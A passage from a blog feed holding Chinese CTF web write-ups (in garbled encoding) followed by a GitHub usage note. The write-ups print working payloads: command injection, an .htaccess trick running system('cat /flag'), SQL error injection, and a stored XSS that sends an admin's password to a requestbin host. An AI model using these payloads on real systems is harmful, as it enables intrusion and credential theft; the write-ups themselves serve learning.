data-language="php"><code class="language-php">&lt;?phpsession_start();echo &quot;&lt;meta http-equiv&#x3D;\&quot;Content-Type\&quot; content&#x3D;\&quot;text&#x2F;html; charset&#x3D;utf-8\&quot; &#x2F;&gt; &lt;title&gt;Home&lt;&#x2F;title&gt;&quot;;error_reporting(0);if(isset($_SESSION[&#39;user&#39;]))&#123;if(isset($_GET[&#39;file&#39;]))&#123;if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;die(&quot;hacker!&quot;);&#125;else&#123;if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;upload$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;$file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;&#125;else&#123;$file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;&#125;echo &quot;å½“å‰å¼•ç”¨çš„æ˜¯ &quot;.$file;require $file;&#125;&#125;else&#123;die(&quot;no permission!&quot;);&#125;&#125;?&gt;</code></pre><p>ä¸»è¦è¿˜æ˜¯åœ¨uploadé‡Œ</p><p>çœ‹è§è¿™ä¿©å‡½æ•°å°±ç›´æ¥çŒœæ˜¯ååºåˆ—åŒ–äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221735567.png" alt="image-20220719221735567"></p><p>ä½†æ˜¯æ²¡ç”¨ååºåˆ—åŒ–å‡½æ•°ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯pharçš„ååºåˆ—åŒ–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221819320.png" alt="image-20220719221819320"></p><p>file_get_contentsåˆšå¥½èƒ½è§¦å‘</p><p><code>file_get_contents()</code> ä½¿ <code>$uploader</code> é€šè¿‡<code>__toString()</code> è¿”å› <code>$this-&gt;Filename</code>ï¼Œ<code>$this-&gt;Filename</code> å¯æ§ï¼Œå› æ­¤æ­¤å¤„ <code>$this-&gt;Filename</code> ç”¨æ¥è§¦å‘ pharï¼Œ<code>__destruct()</code> æ–¹æ³•å†… <code>eval($this-&gt;cmd);</code> è¿›è¡Œ RCE</p><pre class="language-php" data-language="php"><code class="language-php">function __destruct()&#123;    if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;        $this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;    &#125;    eval($this-&gt;cmd);&#125;</code></pre><p>åªè¦<code>$this-&gt;token</code> å’Œ <code>$_SESSION[&#39;user&#39;]</code> ç›¸ç­‰ï¼Œæˆ‘ä»¬å°±èƒ½æ‰§è¡Œè‡ªå·±çš„å‘½ä»¤</p><p> <code>$_SESSION[&#39;user&#39;]</code>æˆ‘ä»¬åœ¨ä¸åŠ nameå‚æ•°çš„æ—¶å€™ä¸Šä¼ æ–‡ä»¶å°±ä¼šä½œä¸ºæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235107502.png" alt="image-20220719235107502"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235345024.png" alt="image-20220719235345024"></p><p>GXYc20516553292cd91851e49f51dda07ef</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235817304.png" alt="image-20220719235817304"></p><p>æŠŠå¾—åˆ°çš„è·¯å¾„ä½œä¸ºnameçš„å€¼ç„¶åéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235951088.png" alt="image-20220719235951088"></p><p>å†æ¥çœ‹çœ‹éé¢„æœŸè§£</p><p><strong>ä¸€</strong></p><p>å› ä¸ºnameå‚æ•°çš„å€¼å°±æ˜¯æ–‡ä»¶åï¼Œä¹Ÿæ²¡è¿‡æ»¤phpï¼Œæ‰€ä»¥ç›´æ¥è®©name=1.phpä¼ é©¬å°±å¾—äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720000525217.png" alt="image-20220720000525217"></p><p><strong>äºŒ</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720000611322.png" alt="image-20220720000611322"></p><p>ä¸Šä¼ åä¼šæ˜¾ç¤ºå‡º <code>$uploader</code> è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥åªè¦ä½¿ <code>$this-&gt;Filename</code> ä¸º <code>flag.php</code> ç„¶åéšä¾¿ä¼ ä¸ªä¸œè¥¿å°±ä¼šå¾—åˆ° flag äº†ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720001429927.png" alt="image-20220720001429927"></p><p>ï¼ˆåˆ«ä¼ å¸¦å†…å®¹çš„æ–‡ä»¶ï¼Œä¼šè¢«è¦†ç›–ï¼Œè¦ç”¨ç©ºæ–‡ä»¶</p><h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$comm1 &#x3D; $_GET[&#39;comm1&#39;];$comm2 &#x3D; $_GET[&#39;comm2&#39;];if(preg_match(&quot;&#x2F;\&#39;|\&#96;|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $comm1))    $comm1 &#x3D; &quot;&quot;;if(preg_match(&quot;&#x2F;\&#39;|\&quot;|;|,|\&#96;|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w&#x2F;is&quot;, $comm2))    $comm2 &#x3D; &quot;&quot;;$flag &#x3D; &quot;#flag in &#x2F;flag&quot;;$comm1 &#x3D; &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;$comm2 &#x3D; &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;$cmd &#x3D; &quot;file $comm1 $comm2&quot;;system($cmd);?&gt;</code></pre><p>payload</p><pre class="language-none"><code class="language-none">?comm1&#x3D;&quot;;tac &#x2F;fla?;&quot;&amp;comm2&#x3D;1</code></pre><p>åˆ©ç”¨ç®¡é“ç¬¦ç¬¦åˆ†å‰²å‘½ä»¤ï¼ŒåŒæ—¶åœ¨å‘½ä»¤å‰ååŠ åŒå¼•å·è¿›è¡Œé—­åˆæ“ä½œï¼Œå†ç”¨é€šé…ç¬¦ç»•è¿‡å¯¹flagçš„è¿‡æ»¤</p><h2 id="ç¾ŠåŸæ¯2020-easyphp"><a href="#ç¾ŠåŸæ¯2020-easyphp" class="headerlink" title="[ç¾ŠåŸæ¯2020]easyphp"></a>[ç¾ŠåŸæ¯2020]easyphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $files &#x3D; scandir(&#39;.&#x2F;&#39;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content &#x3D; $_GET[&#39;content&#39;];    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename &#x3D; $_GET[&#39;filename&#39;];    if(preg_match(&quot;&#x2F;[^a-z\.]&#x2F;&quot;, $filename) &#x3D;&#x3D; 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files &#x3D; scandir(&#39;.&#x2F;&#39;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\nHello, world&quot;);?&gt;</code></pre><p>æœ‰file_put_contentsï¼Œå¯ä»¥è¯•ç€å†™phpæ–‡ä»¶è¿›å»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824204634727.png" alt="image-20220824204634727"></p><p>å‘ç°æ²¡æœ‰è¢«è§£æï¼Œå¯èƒ½æ˜¯è®¾ç½®åªå…è®¸è§£æindex.php</p><p>è¿™æ—¶å€™å¯ä»¥å°è¯•ä½¿ç”¨.htaccess</p><p><strong>.htaccess ä¸­æœ‰ # å•è¡Œæ³¨é‡Šç¬¦, ä¸”æ”¯æŒ \æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œã€‚(æ³¨æ„åé¢è¿™ä¸ªä¸œè¥¿å¾ˆé‡è¦)</strong></p><p>[<a href="https://y4tacker.blog.csdn.net/article/details/116666720?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-116666720-blog-111307475.pc_relevant_multi_platform_featuressortv2dupreplace&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-116666720-blog-111307475.pc_relevant_multi_platform_featuressortv2dupreplace&utm_relevant_index=4">CTF].htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“_Y4tackerçš„åšå®¢-CSDNåšå®¢_.htaccess ctf</a></p><p>å¯ä»¥çœ‹ä¸€ä¸‹y4å¸ˆå‚…å†™çš„è¿™ä¸ª.htaccessçš„æ–‡ç« </p><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¿™é“é¢˜çš„å…³é”®ï¼Œå› ä¸ºunlinkçš„é™åˆ¶ï¼Œæˆ‘ä»¬åªè¢«å…è®¸å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥åªèƒ½å°è¯•ç”¨.htaccessæŠŠè‡ªå·±åŒ…å«æ‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824213753335.png" alt="image-20220824213753335"></p><pre class="language-none"><code class="language-none">filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0Ae%20.htaccess%0A%23%3C?php%20system(%27cat%20&#x2F;fla%27.%27g%27);?%3E\?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_append_fil\%0Ae%20.htaccess%0A%23&lt;?php system(&quot;cat &#x2F;f*&quot;);?&gt;\eä¸¤ä¸ªä¸å¤ªä¸€æ ·çš„payloadï¼ŒåŒºåˆ«åœ¨äºauto_append_fileå’Œauto_prepend_file</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824220105320.png" alt="image-20220824220105320"></p><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>login.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>cookie <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> arr <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        cookie<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¹Ÿå°±æ˜¯æŠŠç”¨æˆ·åå’Œå¯†ç éƒ½å†™è¿›äº†è¡¨å•é‡Œ</p><p>æ³¨å†Œä¸ªè´¦æˆ·ç„¶åç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªç±»ä¼¼ç•™è¨€æ¡†çš„ä¸œè¥¿</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114219285.png" alt="image-20220825114219285"></p><p>æºç é‡Œè¿˜æœ‰ä¸€äº›è¿‡æ»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114348683.png" alt="image-20220825114348683"></p><p>è¿™é‡Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡ï¼Œç„¶åè¿™é‡Œæ˜¯å¯ä»¥æ‰§è¡Œjsè„šæœ¬çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114150963.png" alt="image-20220825114150963"></p><p>æ‰€ä»¥è¿™é¢˜å®é™…ä¸Šå°±ç±»ä¼¼äºä¸€ä¸ªxss</p><p>login.jsä¸­çš„è®°ä½å¯†ç åŠŸèƒ½ä¼šå°†è¯»å–cookieä¸­çš„passwordã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªç™»å½•æ¡†å¹¶ä¸”å¼•å…¥login.jsæäº¤åé¦ˆç­‰å¾…botç‚¹å¼€è·å¾—flag</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt scookierc<span class="token operator">=</span><span class="token string">"./js/login.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt<span class="token operator">></span>    <span class="token keyword">var</span> pwd <span class="token operator">=</span> docucookiement<span class="token punctuation">.</span><span class="token function">getcookieElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/xxx/?a="</span><span class="token operator">+</span>pwd<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span></code></pre><p><strong>åªè¦æˆ‘ä»¬å†™ç•™è¨€ï¼Œå°±æŒ‰å‰ç«¯ä»£ç çš„æ ¼å¼å†™ï¼Œç”¨æˆ·æŸ¥çœ‹ç•™è¨€çš„æ—¶å€™ç•™è¨€çš„ä»£ç ä¼šåµŒå…¥åˆ°å‰ç«¯ä»£ç é‡Œæ‰§è¡Œã€‚</strong></p><p><strong>ç•™è¨€çš„å†…å®¹å¤§æ¦‚æ˜¯ä¸¤ä¸ª&lt;input&gt;æ ‡ç­¾ï¼Œåˆ†åˆ«æ˜¯usernameå’Œpasswordï¼Œç„¶å&lt;script src=./js/login.js&gt;&lt;/script&gt;</strong></p><p><strong>å› ä¸ºç®¡ç†å‘˜æŸ¥çœ‹çš„æ—¶å€™è‚¯å®šæ˜¯æœ‰cookieçš„ï¼Œå°±ä¼šå¡«å……åˆ°ä¸¤ä¸ªinputï¼Œç„¶åç”¨javasriptçš„ä»£ç è·å–&lt;input&gt;çš„valueï¼Œå†ç”¨javascriptä»£ç </strong></p><pre class="language-none"><code class="language-none">document.location&#x3D;&#96;&#96;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;xxxxxx&#x2F;?a&#x3D;&quot;&#96;&#96;+pwd;</code></pre><p> å‘é€åˆ°å¹³å°ä¸Šï¼ˆhttp.requestbin.buuoj.cnå¯ä»¥çœ‹å‘å®ƒè¯·æ±‚çš„httpåŒ…ï¼‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825115220166.png" alt="image-20220825115220166"></p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>å·²ç»å‘Šè¯‰è¿‡æ»¤äº†é‚£äº›äº†</p><p>å…ˆç”¨order byè¯•ä¸€ä¸‹åˆ—æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825115659726.png" alt="image-20220825115659726"></p><p>å¯ä»¥æµ‹å‡ºæœ‰ä¸¤åˆ—ï¼Œé‚£ä¸€åˆ—æ˜¯uniqueidï¼Œå¦ä¸€åˆ—å¯èƒ½å°±æ˜¯flag</p><p>ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç”¨ä¸‡èƒ½å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825120840923.png" alt="image-20220825120840923"></p><p>å¦ä¸€ç§å°±æ˜¯æŠ¥é”™æ³¨å…¥æ‹¿åˆ°å¯†ç </p><pre class="language-none"><code class="language-none">1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1)</code></pre><p>837461526918364526</p><p>åšå®Œä¹‹åçœ‹ä¸€ä¸‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121558457.png" alt="image-20220825121558457"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªmysqli_num_rowså‡½æ•°æ¥åˆ¤æ–­è¿”å›çš„è¡Œæ•°ï¼Œè‹¥ä¸º1æ‰ä¼šè¿›å…¥ifé‡Œé¢çš„å†…å®¹ï¼Œè€Œåœ¨æ•°æ®åº“é‡Œæ’å…¥äº†ä¸¤æ¡æ•°æ®<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121702801.png" alt="image-20220825121702801"></p><p>æ‰€ä»¥è¿™é‡Œä¸‡èƒ½å¯†ç åè¾¹å¿…é¡»åŠ ä¸Šlimit 0,1æ‰èƒ½æˆåŠŸ</p><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>githubä½¿ç”¨</title>
      <link href="/2021/10/02/github%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/02/github%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>â€‹    åœ¨å­¦pythonçš„æ—¶å€™é¡ºä¾¿å­¦äº†äº›GitHubçš„ä½¿ç”¨ï¼Œå†™ä¸ªæ–‡æ¡£é˜²æ­¢å¿˜äº†</p> <span id="more"></span><p><strong>ç»‘å®šç”¨æˆ·</strong></p><p>æ‰“å¼€git-bash</p><p>å¡«å†™ç”¨æˆ·åå’Œå¯†ç </p><p>æç¤ºï¼ˆé…ç½®çš„å¸å·åå’Œé‚®ç®±ä¸€å®šè¦ä¸GitHubç›¸åŒï¼Œä¸ç„¶ä¼šæäº¤å¤±è´¥ï¼‰</p><pre class="language-none"><code class="language-none">git config --global user.name &quot;@@@&quot;     (GitHubç›¸å¯¹åº”çš„å¸å·åç§°)git config --global user.email &quot;123@163.com&quot;  ï¼ˆGitHbuç›¸å¯¹åº”çš„é‚®ç®±å¸å·ï¼‰</code></pre><p><strong>è®¾ç½®ssh key</strong></p><p>ç”Ÿæˆssh key</p><p>é¦–å…ˆæ£€æŸ¥æ˜¯å¦å·²ç”Ÿæˆå¯†é’¥ cd ~/.sshï¼Œlså¦‚æœæœ‰3ä¸ªæ–‡ä»¶ï¼Œåˆ™å¯†é’¥å·²ç»ç”Ÿæˆï¼Œid_rsa.pubå°±æ˜¯å…¬é’¥</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNDU0MTYwMjAtOTMyNTYwNjcxLnBuZw?x-oss-process=image/format,png" alt="img"></p><p> å¦‚æœæ²¡æœ‰ï¼Œè¾“å…¥: ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ç®±&quot;</p><p>å¤åˆ¶ssh key</p><p> æ–¹æ³•1: è¾“å…¥ clip &lt; ~/.ssh/id_rsa.pub   ä¼šè‡ªåŠ¨å¤åˆ¶ssh keyï¼Œå¯ä»¥ç›´æ¥ç²˜è´´</p><p> æ–¹æ³•2:åœ¨c/Users/Administrator/.ssh/id_rsa)æ–‡ä»¶æ‰¾åˆ°ç›´æ¥å¤åˆ¶</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTA5MzI2MTItMTQ3ODE2MTQ3NC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>è¿æ¥githubï¼Œæ‰“å¼€GitHub è¿›å…¥settingæ‰¾åˆ°ssh keyå¹¶æ–°å»º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/format,png.png" alt="img">format,png.png)</p><p>ç„¶åæµ‹è¯•è¿æ¥æ˜¯å¦æˆåŠŸ</p><p>è¾“å…¥: ssh -T <a href="mailto:&#x67;&#105;&#116;&#64;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#x6f;&#109;">&#x67;&#105;&#116;&#64;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#x6f;&#109;</a> </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTI1MDg3MzYtNDUwMTA1MTMwLnBuZw?x-oss-process=image/format,png" alt="img"></p><p><strong>ä¸Šä¼ </strong></p><p>ä¸Šä¼ çš„åŸºæœ¬æ­¥éª¤å°±æ˜¯è¿™æ ·äº†</p><p>å…ˆæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¤¹æŒ‰ç€å›¾ç‰‡é‡Œçš„æ­¥éª¤æ¥</p><p>å…ˆåˆå§‹åŒ–å†æŠŠæƒ³ä¼ çš„æ–‡ä»¶ä¼ ä¸Šå»</p><p>å¯ä»¥ç”¨git add .ä¸Šä¼ æ‰€æœ‰æ–‡ä»¶</p><pre class="language-none"><code class="language-none">æ³¨ï¼šè¾“å…¥git add .åå¦‚æœæŠ¥é”™warning: LF will be replaced by CRLF in gradlew.The file will have its original line endings in your working directoryåˆ™åœ¨è¾“å…¥git config --global core.autocrlf falseåå†é‡æ–°è¾“å…¥git add .å‘½ä»¤å³å¯</code></pre><p>git commitæ·»åŠ å¤‡æ³¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/image-20211002123234287.png" alt="image-20211002123234287"></p><p>å…‹éš†ä»“åº“</p><pre class="language-console" data-language="console"><code class="language-console">$ git clone ç½‘å€ [è‡ªå®šä¹‰ç›®å½•å]</code></pre><p>å¯ä»¥ç”¨https://æˆ–git://æˆ–sshä¼ è¾“åè®®</p><p>æŸ¥çœ‹è¿æ¥çš„ä»“åº“åœ°å€</p><pre class="language-none"><code class="language-none">git remote -v</code></pre><p>å¦‚æœåœ¨å¦å¤–çš„æ–‡ä»¶å¤¹æäº¤éœ€é‡æ–°è¿›è¡Œä¸€éå›¾ä¸­æ­¥éª¤</p><p>è¿˜è¦å†pushå‰è¾“å…¥</p><pre class="language-none"><code class="language-none">git pull --rebase origin main</code></pre><p>è¯¥å‘½ä»¤çš„æ„æ€æ˜¯æŠŠè¿œç¨‹åº“ä¸­çš„<strong>æ›´æ–°åˆå¹¶</strong>åˆ°ï¼ˆ<strong>pull=fetch+merge</strong>ï¼‰æœ¬åœ°åº“ä¸­ï¼Œ<strong>â€“-rebase</strong>çš„ä½œç”¨æ˜¯å–æ¶ˆæ‰æœ¬åœ°åº“ä¸­åˆšåˆšçš„commitï¼Œå¹¶æŠŠä»–ä»¬<strong>æ¥åˆ°</strong>æ›´æ–°åçš„ç‰ˆæœ¬åº“ä¹‹ä¸­ã€‚å‡ºç°å¦‚ä¸‹å›¾æ‰§è¡Œpullæ‰§è¡ŒæˆåŠŸåï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œgit push origin mainæ“ä½œã€‚</p><p>å¦åˆ™å°±ä¼šå› ä¸ºæœ¬åœ°åº“ä¸è¿œç¨‹åº“ä¸ä¸€è‡´å¯¼è‡´æŠ¥é”™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/image-20211002130237512.png" alt="image-20211002130237512"></p>]]></content>
      
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ€»ç»“</title>
      <link href="/2021/08/31/%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/31/%E6%80%BB%E7%BB%93/</url>
      
